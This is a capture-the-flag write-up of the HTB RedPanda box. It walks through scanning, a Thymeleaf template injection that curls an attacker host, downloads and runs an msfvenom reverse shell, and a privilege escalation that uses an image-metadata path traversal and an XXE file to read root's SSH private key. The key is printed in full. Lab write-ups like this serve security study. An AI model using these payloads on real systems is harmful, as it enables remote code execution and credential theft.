# Scan

```bash
ghost@localhost [00:34:53] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.170:8080

PORT     STATE SERVICE    REASON  VERSION
8080/tcp open  http-proxy syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Tue, 25 Oct 2022 16:35:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 25 Oct 2022 16:35:49 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 25 Oct 2022 16:35:51 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=10/26%Time=63581063%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
SF:et=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Tue,\x2025\x20Oct\x2
SF:02022\x2016:35:49\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20
SF:\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wood
SF:en_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codep
SF:en\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/
SF:css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20
SF:with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20
SF:\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20
SF:right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\
SF:x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20<
SF:/div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\
SF:x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20T
SF:ue,\x2025\x20Oct\x202022\x2016:35:49\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text
SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2043
SF:5\r\nDate:\x20Tue,\x2025\x20Oct\x202022\x2016:35:51\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x
SF:20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h
SF:1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\
SF:x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14p
SF:x;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heig
SF:ht:1px;background-color:#525D76;border:none;}</style></head><body><h1>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></htm
SF:l>");
```


# 8080

```bash
ghost@localhost [00:45:34] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % feroxbuster -u http://$DOMAIN:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k
200      GET       55l      119w        0c http://10.10.11.170:8080/
405      GET        1l        3w        0c http://10.10.11.170:8080/search
200      GET       32l       97w        0c http://10.10.11.170:8080/stats
500      GET        1l        1w        0c http://10.10.11.170:8080/error
```

Going to `/error` gives `Whitelabel Error Page`. Googling what is Whitelabel shows that it is from Spring MVC framework. From additional googling, it seems the server is using https://www.thymeleaf.org/ for template engine.

It is vulnerable to SSTI because searching `(7*7)` returns `49`.

Found the following cheatsheet for hacking thymeleaf (https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/).

So there are 5 expressions in total, and `Variable expresions: $` seems to be blocked. But `Selection expression: *` works fine.

From [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java), found the script to curl with SSTI, and it works.

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.14.3")}


ghost@localhost [01:13:23] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [26/Oct/2022 01:13:32] "GET / HTTP/1.1" 200 -
```\\

# User

So I generated stageless reverse shell with msfvenom, download to the server and execute it back to receives reverse shell.

```bash
ghost@localhost [01:22:31] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf > shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.14.3/shell.elf -o shell.elf")}


ghost@localhost [01:23:15] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [26/Oct/2022 01:24:20] "GET /shell.elf HTTP/1.1" 200 -


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod +x shell.elf")}
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./shell.elf")}


ghost@localhost [01:25:01] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.170] 50558
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)

```

So user.txt is read from home directory.

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cd ~

woodenk@redpanda:/home/woodenk$ ls
user.txt

woodenk@redpanda:/home/woodenk$ cat user.txt
2ee68caffde276c4681b8d276bacdae1
```

When I check `id` I found out the user also belongs to `logs` group.

```bash
woodenk@redpanda:/home/woodenk$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```


# Privilege escalation

Running pspy on the machine, gives the following process running as root.

```bash
2022/11/20 08:56:01 CMD: UID=0    PID=16717  | /bin/sh -c /root/run_credits.sh
2022/11/20 08:56:01 CMD: UID=0    PID=16719  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

I then decompile and read `App.class`

```java
package com.logparser;  
  
import com.drew.imaging.jpeg.JpegMetadataReader;  
import com.drew.imaging.jpeg.JpegProcessingException;  
import com.drew.metadata.Directory;  
import com.drew.metadata.Metadata;  
import com.drew.metadata.Tag;  
import java.io.BufferedWriter;  
import java.io.File;  
import java.io.FileWriter;  
import java.io.IOException;  
import java.util.HashMap;  
import java.util.Map;  
import java.util.Scanner;  
import org.jdom2.Document;  
import org.jdom2.Element;  
import org.jdom2.JDOMException;  
import org.jdom2.input.SAXBuilder;  
import org.jdom2.output.Format;  
import org.jdom2.output.XMLOutputter;  
  
public class App {  
  public static Map parseLog(String line) {  
    String[] strings = line.split("\\|\\|");  
    Map<Object, Object> map = new HashMap<>();  
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));  
    map.put("ip", strings[1]);  
    map.put("user_agent", strings[2]);  
    map.put("uri", strings[3]);  
    return map;  
  }  
    
  public static boolean isImage(String filename) {  
    if (filename.contains(".jpg"))  
      return true;   
    return false;  
  }  
    
  public static String getArtist(String uri) throws IOException, JpegProcessingException {  
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;  
    File jpgFile = new File(fullpath);  
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);  
    for (Directory dir : metadata.getDirectories()) {  
      for (Tag tag : dir.getTags()) {  
        if (tag.getTagName() == "Artist")  
          return tag.getDescription();   
      }   
    }   
    return "N/A";  
  }  
    
  public static void addViewTo(String path, String uri) throws JDOMException, IOException {  
    SAXBuilder saxBuilder = new SAXBuilder();  
    XMLOutputter xmlOutput = new XMLOutputter();  
    xmlOutput.setFormat(Format.getPrettyFormat());  
    File fd = new File(path);  
    Document doc = saxBuilder.build(fd);  
    Element rootElement = doc.getRootElement();  
    for (Element el : rootElement.getChildren()) {  
      if (el.getName() == "image")  
        if (el.getChild("uri").getText().equals(uri)) {  
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);  
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));  
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));  
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));  
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));  
        }    
    }   
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));  
    xmlOutput.output(doc, writer);  
  }  
    
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {  
    File log_fd = new File("/opt/panda_search/redpanda.log");  
    Scanner log_reader = new Scanner(log_fd);  
    while (log_reader.hasNextLine()) {  
      String line = log_reader.nextLine();  
      if (!isImage(line))  
        continue;   
      Map parsed_data = parseLog(line);  
      System.out.println(parsed_data.get("uri"));  
      String artist = getArtist(parsed_data.get("uri").toString());  
      System.out.println("Artist: " + artist);  
      String xmlPath = "/credits/" + artist + "_creds.xml";  
      addViewTo(xmlPath, parsed_data.get("uri").toString());  
    }   
  }  
}
```

Based on the code, it read the log from `/opt/panda_search/redpanda.log` then check if it is an image.

In log, it must be as follow, splitted by `\\|\\|`.

- first part is `status_code` an interger
- second part is `ip` string
- third part is `user agent` string
- last part is `uri` also a string, and this part must point to an image (in jpg).

From the jpg image, it reads the image Metadata, `tag = Artist`.

Once the artist name is received, it will output an XML file under `/credits/<artist>/_creds.xml`. However, since the current user does not have write access to `/credits` (as you can see below), I need to set artist name to `../tmp/ghost` so it will output file at `/tmp/ghost_creds.xml`.

```bash
woodenk@redpanda:/opt/credit-score/LogParser/final/target$ ls -l /credits
total 8
-rw-r----- 1 root logs 422 Jun 21 12:31 damian_creds.xml
-rw-r----- 1 root logs 426 Jun 21 12:32 woodenk_creds.xml

woodenk@redpanda:/opt/credit-score/LogParser/final/target$ cat /credits/woodenk_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

First I set the tag as below.

```bash
ghost@localhost [17:12:38] [~/Documents/hacking/tj-null-boxes/redpanda] [master *]
-> % exiftool -Artist="../tmp/gigachad" gigachad.jpg
    1 image files updated
```

Then I recreate a `gigachad_creds.xml` in same format as the rest. But with XML entity expansion attack, you can read more about it here (https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_java.html#vulnerable-example-1).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [
	<!ELEMENT pwn ANY >
	<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
	<author>gigachad</author>
	<image>
		<uri>/../../../../../../tmp/gigachad.jpg</uri>
		<views>0</views>
		<pwn>&xxe;</pwn>
	</image>
	<totalviews>0</totalviews>
</credits>
```

Also remembering when the log file is read, it will be checking the image under `/opt/panda_search/src/main/resources/static`.

However, I do not have write access to it to upload our image, so I need to write the log file with directory traversal attack as below.

```bash
200||a||a||/../../../../../../tmp/gigachad.jpg
```

So I upload everything to the server.

```bash
woodenk@redpanda:/tmp$ wget 10.10.14.3/gigachad.jpg
woodenk@redpanda:/tmp$ wget 10.10.14.3/gigachad_creds.xml
woodenk@redpanda:/tmp$ echo "200||a||a||/../../../../../../tmp/gigachad.jpg" > /opt/panda_search/redpanda.log
```

After I while, I got back the root SSH key.

```bash
</credits>woodenk@redpanda:/tmp$ cat gigachad_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn>
<credits>
  <author>gigachad</author>
  <image>
    <uri>/../../../../../../tmp/gigachad.jpg</uri>
    <views>1</views>
    <pwn>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</pwn>
  </image>
  <totalviews>1</totalviews>
</credits>
```

You can then SSH into the machine and get the flag.

```bash
root@redpanda:~# cat /root/root.txt
5afaf9fef744f00043da5a75ecbe2619
```
